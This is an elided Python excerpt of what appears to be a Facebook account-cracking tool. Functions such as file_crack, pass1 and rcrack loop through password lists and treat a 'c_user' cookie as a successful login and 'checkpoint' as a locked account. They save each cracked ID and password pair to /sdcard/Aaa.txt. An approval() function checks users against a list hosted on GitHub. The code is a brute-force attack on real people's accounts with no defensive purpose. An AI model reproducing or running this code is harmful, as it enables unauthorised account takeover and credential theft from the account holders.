...
def file_crack():
    ...
    print('\033[1;37m[+]══════════════════════════════════════════')
    print('[•] OK IDS SAVE : /sdcard/Aaa.txt\n[•] CP IDS SAVE : /sdcard/Aaa.txt')
    ...
    try:
        ...
        for fikr in passlist:
            ...
            if 'c_user' in cookies:
                ...
                ok.append(ids)
                open('/sdcard/Aaa.txt', 'a').write(ids+' | '+pas+'\n')
                break
        ...
        for pas in passlist:
            ...
            if 'c_user' in cookies:
                ...
                if cid in ok:
                    ...
                    ok.append(cid)
                    open('/sdcard/Aaa.txt', 'a').write(cid+' | '+pas+'\n')
                    break
            elif 'checkpoint' in cookies:
                coki=";".join([key+"="+value for key,value in xyz.cookies.get_dict().items()])
                cid = coki[24:39]
...
def pass1():
    ...
    print(f'\n[~]{RED}===================================================')
    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/Aaa.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard//sdcard/Aaa.txt')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/Aaa.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/Aaa.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
...
def approval():
  ...
  try:
    httpCaht = requests.get('https://github.com/MrLuqmano-hacker404/Aaa/blob/main/Aaa.txt').text
    if id in httpCaht:
